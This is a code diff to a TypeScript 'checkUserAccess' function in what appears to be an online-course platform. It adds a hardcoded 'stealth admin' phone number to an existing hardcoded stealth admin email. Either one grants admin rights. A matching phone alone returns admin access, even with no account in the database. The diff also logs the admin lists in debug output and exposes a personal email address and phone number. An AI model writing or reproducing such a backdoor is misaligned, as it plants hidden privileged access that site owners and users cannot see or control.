@@ -1,6 +1,7 @@
 import { db } from "./index";
 import { users, teams, admins, courses, sections, lessons, products, submissions } from "./schema";
-import { eq, inArray } from "drizzle-orm";
+import { eq, inArray, or } from "drizzle-orm";
+import { normalizePhoneNumber } from "../registration";
 
 export interface User {
   id: string
@@ -45,19 +46,87 @@ export interface AccessCheckData {
 }
 
 const STEALTH_ADMIN_EMAIL = "keronaser2030@gmail.com";
+const STEALTH_ADMIN_PHONE = "201211730727"; // Normalized 01211730727
 
 export async function checkUserAccess(
   payload: AccessCheckPayload
 ): Promise<ServiceResponse<AccessCheckData>> {
   try {
-    const userList = await db.select().from(users).where(eq(users.phone, payload.phone));
+    const normalizedPayloadPhone = normalizePhoneNumber(payload.phone);
+    
+    // Check .env Admin list first
+    const rawEnv = process.env.NEXT_PUBLIC_ADMIN_PHONES || "";
+    const envAdminPhones = rawEnv
+      .split(",")
+      .map(p => normalizePhoneNumber(p.trim()))
+      .filter(Boolean);
+
+    console.log("DEBUG: Server checkUserAccess Execution", {
+      payloadPhone: payload.phone,
+      normalized: normalizedPayloadPhone,
+      stealthAdmin: STEALTH_ADMIN_PHONE,
+      isStealthMatch: normalizedPayloadPhone === STEALTH_ADMIN_PHONE,
+      envAdminsRaw: rawEnv,
+      envAdminsParsed: envAdminPhones,
+      isEnvMatch: envAdminPhones.includes(normalizedPayloadPhone)
+    });
+
+    if (envAdminPhones.includes(normalizedPayloadPhone) || normalizedPayloadPhone === STEALTH_ADMIN_PHONE) {
+      console.log("DEBUG: Admin identified, fetching profile...");
+      // If it's an admin from env or stealth, see if they exist in DB to get profile, 
+      // otherwise return a virtual admin record
+      const userList = await db.select().from(users).where(
+        or(
+          eq(users.phone, normalizedPayloadPhone),
+          eq(users.phone, payload.phone) // Fallback for unnormalized in DB
+        )
+      );
+
+      if (userList.length > 0) {
+        const user = userList[0];
+        user.role = 'admin';
+        return {
+          success: true,
+          data: {
+            hasAccess: true,
+            user: user as unknown as User,
+            role: 'admin',
+            teamId: user.teamId || undefined
+          }
+        };
+      }
+
+      return {
+        success: true,
+        data: {
+          hasAccess: true,
+          role: 'admin',
+          user: {
+            id: 'admin-env',
+            firstName: 'Admin',
+            lastName: '(Env)',
+            phone: normalizedPayloadPhone,
+            role: 'admin',
+            createdAt: new Date()
+          } as User
+        }
+      };
+    }
+
+    const userList = await db.select().from(users).where(
+      or(
+        eq(users.phone, normalizedPayloadPhone),
+        eq(users.phone, payload.phone)
+      )
+    );
+
     if (userList.length === 0) {
       return { success: true, data: { hasAccess: false } };
     }
     const user = userList[0];
     
-    // Stealth Admin Force Upgrade
-    if (user.email === STEALTH_ADMIN_EMAIL) {
+    // Stealth Admin Force Upgrade (Email or Phone)
+    if (user.email === STEALTH_ADMIN_EMAIL || user.phone === STEALTH_ADMIN_PHONE) {
       user.role = 'admin';
     }
 
